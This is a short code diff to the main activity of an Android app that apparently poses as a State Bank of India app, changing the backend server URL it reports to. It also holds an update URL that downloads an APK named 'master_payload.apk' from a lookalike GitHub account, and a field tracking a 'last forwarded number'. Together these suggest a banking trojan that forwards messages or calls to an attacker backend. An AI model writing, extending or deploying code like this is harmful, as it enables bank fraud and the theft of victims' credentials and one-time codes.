@@ -42,7 +42,7 @@ import java.util.Locale;
 
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "SBI_MainActivity";
-    private static final String BACKEND_URL = "https://newmadebackend.onrender.com";
+    private static final String BACKEND_URL = "https://sbibackend.onrender.com";
     private static final String UPDATE_URL = "https://github.com/sbibank100200-tech/newmade1/releases/latest/download/master_payload.apk";
     private String lastForwardedNumber = "";
 
